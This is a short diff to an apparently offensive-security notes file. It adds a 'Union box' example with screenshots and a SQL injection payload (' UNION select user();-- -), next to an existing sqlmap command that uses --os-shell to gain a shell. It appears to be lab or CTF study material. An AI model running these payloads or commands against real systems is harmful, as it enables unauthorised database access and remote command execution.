@@ -55,6 +55,19 @@ sqlmap -r tosql --os-shell
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7707e8bc-3a1e-465f-b8ff-28ebf589e2f8)
 
 
+## Examples
+
+## Union box
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/df9e7367-c6f6-4ecb-a3cc-4adecc5d4682)
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/93eec906-1c0e-4695-91e9-b890e734ad32)
+
+```
+' UNION select user();-- -
+```
+
+
 
 ## CheatSheet
 More comprehensive can be found Payloadallthethings
